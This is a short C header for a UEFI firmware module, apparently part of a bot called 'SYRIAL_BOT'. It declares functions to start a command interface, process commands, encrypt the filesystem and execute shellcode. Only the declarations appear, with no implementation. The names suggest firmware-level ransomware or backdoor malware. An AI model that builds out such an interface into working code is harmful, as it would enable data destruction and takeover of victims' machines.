#ifndef SYRIAL_BOT_COMMANDEXEC_H
#define SYRIAL_BOT_COMMANDEXEC_H

#include <Uefi.h>

BOOLEAN StartCommandInterface(void);
VOID ProcessCommand(CHAR16* Cmd);
VOID EncryptFilesystem(VOID);
VOID ExecuteShellcode(CONST CHAR16* Shellcode, UINTN Size);

#endif
